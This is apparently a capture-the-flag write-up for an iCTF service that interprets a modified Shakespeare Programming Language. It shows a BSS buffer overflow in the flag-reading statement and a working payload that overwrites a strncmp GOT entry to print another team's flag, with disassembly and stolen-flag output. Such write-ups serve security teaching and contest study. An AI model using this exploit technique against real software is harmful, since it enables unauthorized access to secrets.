# Shakespeare

## Description

> Shakespeare Programming Language Interpreter.

This services is provided by the team *UCCSCSC* and is a Flex and Bison
language interpreter. This language is a modified version of
[Shakespeare Programming Language (SPL)][spl] initially designed by Jon Åslund
and Karl Hasselström.

### Basic SPL aspects

This section presents the aspects of the language. If already know it, you can
go directly to the [next section](#modifications-for-the-ictf) which explains
everything CTF-related.

A program in this language look a Shakespeare's play. Among the main elements
in a play are:

- Title
- Dramatis Personae, ie. the list of characters
- Acts and scenes
- Enter, exit and exeunt of characters
- Lines, ie the dialogue

#### Dramatis Personae

It must come after the title and list of usable
[characters/variables](#variables). Each character must be declared in the
following form:

    Name, Description.

However, not all names are acceptable. An exhaustive list of possible names
is available in the file [character.wordlist][character-wl].

#### Variables

As any programming language, this one also includes variables. There are
actually the characters. Each of them has an associated current integer value
and a stack.

They can be modified using 3 different actions:

- `REMEMBER value.` push the value on the stack of the character. His current
value is not modified in the process.
- `RECALL.` pop the first value on the stack in the current value.
- `YOU ARE value.` assign the current value of the character.

A `value` is usually an operation on [constants](#constants) but it can be
[more](#expressions). Uppercase words are one of the possible for
keywords, others may exist but are not useful in the scope of the write-up.

One important thing to remember is that these actions can only occur when
2 characters are on stage, no less and no more. In addition, the modified
variable is the character who is NOT talking.

Here are some examples. For variables, the number between parenthesis is the
current value, and the stack is between brackets.

| Lines                     | Romeo         | Juliet                |
| ------------------------- | ------------- | --------------------- |
|                           | (3) [4 -> 5]  | (7) [8]               |
| Romeo: Remember nothing.  | (3) [4 -> 5]  | (7) **[0 -> 8]**      |
| Romeo: Remember Romeo.    | (3) [4 -> 5]  | (7) **[3 -> 0 -> 8]** |
| Juliet: Recall it.        | **(4) [5]**   | (7) [3 -> 0 -> 8]     |
| Juliet: You are the king. | **(1)** [5]   | (7) [3 -> 0 -> 8]     |

#### Expressions

Expressions are quite similar with other language expressions. You can apply
some operators on [variables](#variables) or [constants](#constants). Only the
syntax changes as it must must fit Shakespeare's language.

Terminal elements of expressions are:
- A character name. It use the character's current value.
- A pronoun (`ME`, `MY`, `YOU`, `YOUR`). It use the corresponding character's
current value.
- A [constant](#constant).

On these terminal elements, you can apply all the following binary or unary
operators:

| SPL operator                                  | Corresponding operation |
| --------------------------------------------- | ----------------------- |
| The difference between X and Y                | X - Y                   |
| The product of X and Y                        | X * Y                   |
| The quotient between X and Y                  | X / Y                   |
| The remainder of the quotient between X and Y | X % Y                   |
| The sum of X and Y                            | X + Y                   |
| The cube of X                                 | X\*\*3                  |
| The factorial of X                            | X!                      |
| The square of X                               | X\*\*2                  |
| The square root of X                          | int(sqrt(X))            |
| Twice X                                       | 2 * X                   |


#### Constants

Constants are a combination of adjectives and nouns classified as positive,
neutral or negative.

* `NOTHING` = 0
* `A/MY/YOUR/HIS adj* noun`. `adj` and `noun` describe a value using these
rules:
    1. If `noun` is neutral or positive the value equals `1 * 2**(Number of
    neutral and positive adjectives)`
    2. If `noun` is negative, the value equals `-1 * 2**(Number of neutral and
    negative adjectives)`

For an exhaustive list of positive, neutral and negative nouns and adjectives,
see the files below:

|           | nouns                             | adjectives                            |
| --------: | :-------------------------------: | :-----------------------------------: |
| positive  | [positive_noun.wordlist][pn-wl]   | [positive_adjective.wordlist][pa-wl]  |
| neutral   | [neutral_noun.wordlist][nun-wl]   | [neutral_adjective.wordlist][nua-wl]  |
| negative  | [negative_noun.wordlist][ngn-wl]  | [negative_adjective.wordlist][nga-wl] |

Here are some examples of constants

| Constant                              | Decimal | Hexadecimal |
| ------------------------------------- | :-----: | :---------: |
| `Nothing`                             | 0       | 0x00        |
| `A King`                              | 1       | 0x01        |
| `A blue big amazing peaceful Heaven`  | 16      | 0x10        |
| `A huge evil lying coward`            | -8      | 0xfffffff8  |

#### Other

There are other features, such as conditional execution, input or output, but
they are useless for the rest of the write-up so they won't be treated here.

### Modifications for the iCTF

For the purpose of the CTF, two statements have been added to the initial
specification:

- `Take my banner.` set a flag
- `Give me your banner.` get a flag

#### Take my banner

This statement use the stack of the talking character to determine the
*flag_id*, the secret key and the *flag*. Each element in the stack is
interpreted as a character which composes a larger string.

3 strings must be present and null-terminated, in a specific order:

1. The *flag_id*
2. The flag secret key
3. The *flag* itself

The *flag* is then stored in a file named after the *flag_id* prefixed with
`flg_`. In this file is saved the secret key and the *flag*, separeted with a
colon.

Example:

| Stack                                         | Filename    | Content     |
| :-------------------------------------------: | :---------: | :---------: |
| `[x, Y, z, \0, P, a, s, s, \0, y, e, s, \0]`  | **flg_xYz** | `Pass:yes`  |

#### Give me your banner

This statement use the stack of the talking character to determine the
*flag_id*, the secret key. Each element in the stack is
interpreted as a character which composes a larger string.

2 strings must be present and null-terminated, in a specific order:

1. The *flag_id*
2. The flag secret key

The file corresponding to the **flag_id** is read and the secret key compared
with the one contained in the file. If they match, the *flag* is printed, but
if they don't, the interpreter stops with an error what is annoying as we'll
see.

## Vulnerabilities

The main vulnerability is obvious and easily detectable when reading the source
code:

```C
#define BUF_SIZE         1024   // size of input buffer(s)
static char generic_buf[BUF_SIZE]   = {0};
/*
 * …
 */
GIVE_ME SECOND_PERSON_POSSESSIVE BANNER StatementSymbol {
// …
do {
  generic_buf[i++] = (char)curr->num;
} while (i < 2047 && (curr = curr->next));
// …
}
```

We can overflow `generic_buf` we using `Give me your banner.`

The `generic_buf` being in the BSS, we won't be able to control the execution
flow that easily. We can take a look at the symbol table to see what can be
overridden:

```
 53: 0805dec0     0 NOTYPE  GLOBAL DEFAULT   25 _end
 47: 0805da60  1024 OBJECT  LOCAL  DEFAULT   25 generic_buf
 48: 0805de60     4 OBJECT  LOCAL  DEFAULT   25 first_person
 49: 0805de64     4 OBJECT  LOCAL  DEFAULT   25 second_person
 50: 0805de68     4 OBJECT  LOCAL  DEFAULT   25 num_on_stage
 51: 0805de6c     4 OBJECT  LOCAL  DEFAULT   25 truth_flag
 66: 0805de7c     4 OBJECT  LOCAL  DEFAULT   25 yy_buffer_stack_top
 67: 0805de80     4 OBJECT  LOCAL  DEFAULT   25 yy_buffer_stack_max
 68: 0805de84     4 OBJECT  LOCAL  DEFAULT   25 yy_buffer_stack
 69: 0805de88     1 OBJECT  LOCAL  DEFAULT   25 yy_hold_char
 70: 0805de8c     4 OBJECT  LOCAL  DEFAULT   25 yy_n_chars
 71: 0805de90     4 OBJECT  LOCAL  DEFAULT   25 yy_c_buf_p
 72: 0805de94     4 OBJECT  LOCAL  DEFAULT   25 yy_init
 73: 0805de98     4 OBJECT  LOCAL  DEFAULT   25 yy_start
 74: 0805de9c     4 OBJECT  LOCAL  DEFAULT   25 yy_did_buffer_switch_on_e
 83: 0805dea0     4 OBJECT  LOCAL  DEFAULT   25 yy_last_accepting_state
 84: 0805dea4     4 OBJECT  LOCAL  DEFAULT   25 yy_last_accepting_cpos
110: 0805dea8     4 OBJECT  GLOBAL DEFAULT   25 yynerrs
133: 0805de70     4 OBJECT  GLOBAL DEFAULT   25 yyin
138: 0805deb8     4 OBJECT  GLOBAL DEFAULT   25 yytext
145: 0805de78     4 OBJECT  GLOBAL DEFAULT   25 yy_flex_debug
172: 0805de74     4 OBJECT  GLOBAL DEFAULT   25 yyout
188: 0805deac     4 OBJECT  GLOBAL DEFAULT   25 yychar
200: 0805dec0     0 NOTYPE  GLOBAL DEFAULT   25 _end
202: 0805debc     4 OBJECT  GLOBAL DEFAULT   25 yyleng
227: 0805deb0     8 OBJECT  GLOBAL DEFAULT   25 yylval
```

None of Bison variables seem interesting enough. However, `first_person`
and `second_person` are. In addition with `pop` or `assign_value`, we could be
able to write whatever we want, wherever we want. Doing so is easy because
the ASLR is disabled.

The main issue is that the *flag* is loaded in memory only when we use `Give me
your banner`. But we can’t get out from this call if we don’t have the right
password.

I couldn't find a way to handle this issue using directly
`Give me your banner.`. Thus, I took a look at the ELF file. I then discovered
the program was dynamically linked and wasn't using the `RELRO` mechanism.
That means the GOT is writable, and this flaw can be used to control the
execution flow.

Now, we must find a GOT.PLT entry to change and we'd rather do it on a function
called after the flag has been loaded in memory.

```C
  if (!getline(&line, &i, f))
    report_error("That's empty");

  i = strlen(pass)<BUF_SIZE?strlen(pass):index(line,':')-line;
  if (strncmp(line, pass, i) == 0
      && line[i] == ':')
    printf("Your banner: %s\n", line+i+1);
  else
    report_error("Invalid password");
```

There are plenty of possibilities here: `strlen`, `index`, `strncmp` or even
functions called in `report_error`. I’ll do it on `strncmp`.


## Proof of Concept

The exploitation will be perform in 2 times. First, the GOT entry of `strncmp`
will be overridden, then we'll read the flag.

### Override GOT entry

As the overflow occurs when reading a banner, we'll need a fake one to overflow
while not getting an error for not knowing the password.

Once a known banner is available, we read it using the following stack:

```python
"%s\0%s" % (known_file, password) + \
"\0" * (BUF_SIZE - len(known_file) - len(password) - 1 + 4 - 4) + \
"\xcc\xd1\x05\x08"
```

The start of the string is here to successfully read the file. The next line
is used to fill the buffer area. `-1` is for the null-byte between the filename
and the password, `-4` is for the initial `flg_` present in the buffer and
`+4` is to reach the `second_person` area. `"\xcc\xd1\x05\x08"` is the address
of `strncmp` GOT entry.

Now that `second_person` is overriden, we need to assign a value to it (as the
value is stored in the first word of the structure). This value should be the
address of the inside of the _if_ statement, where the line is printed.

A quick disassembling of the program gives us the address `0x0804af80`:

```
804af62:       e8 e9 de ff ff          call   8048e50 <strncmp@plt>
804af67:       85 c0                   test   %eax,%eax
804af69:       75 38                   jne    804afa3 <yyparse+0x2004>
804af6b:       8b 95 a8 f7 ff ff       mov    -0x858(%ebp),%edx
804af71:       8b 85 a4 f7 ff ff       mov    -0x85c(%ebp),%eax
804af77:       01 d0                   add    %edx,%eax
804af79:       0f b6 00                movzbl (%eax),%eax
804af7c:       3c 3a                   cmp    $0x3a,%al
804af7e:       75 23                   jne    804afa3 <yyparse+0x2004>
804af80:       8b 85 a8 f7 ff ff       mov    -0x858(%ebp),%eax
804af86:       8b 95 a4 f7 ff ff       mov    -0x85c(%ebp),%edx
804af8c:       83 c2 01                add    $0x1,%edx
804af8f:       01 d0                   add    %edx,%eax
804af91:       89 44 24 04             mov    %eax,0x4(%esp)
804af95:       c7 04 24 f4 26 05 08    movl   $0x80526f4,(%esp)
804af9c:       e8 ef db ff ff          call   8048b90 <printf@plt>
804afa1:       eb 0c                   jmp    804afaf <yyparse+0x2010>
```

### Reading the stolen flag

This is the easy part. Just need to provide a `Give me your banner.` with the
stack having the string:

```python
"%s\0%s" % (flag_id, a_non_empty_string)
```

### Result

Here is the output a such a scenario:

```
Banner received.
Your banner: gN
Your banner: c2N7Ahfkq9oTQeg:FLG14axBwxd2qqWB
```

Wonderful! It works as expected.

### Automation

It's time consuming to create a SPL program, not to say quite impossible. So
to ease its creation, a [ruby script][dsl] provide a DSL to make the
programs. It handles variables naming, value assignment and stack push/pop
operations. But most of all it enables to directly push a string to the stack
of a variable.

This DSL is then used in [poc.rb][poc] to create the play which exploit the
previously presented vulnerability.



[spl]: https://en.wikipedia.org/wiki/Shakespeare_%28programming_language%29
[character-wl]: wordlists/character.wordlist
[pn-wl]: wordlists/positive_noun.wordlist
[pa-wl]: wordlists/positive_adjective.wordlist
[nun-wl]: wordlists/neutral_noun.wordlist
[nua-wl]: wordlists/neutral_adjective.wordlist
[ngn-wl]: wordlists/negative_noun.wordlist
[nga-wl]: wordlists/negative_adjective.wordlist
[dsl]: spl_dsl.rb
[poc]: poc.rb
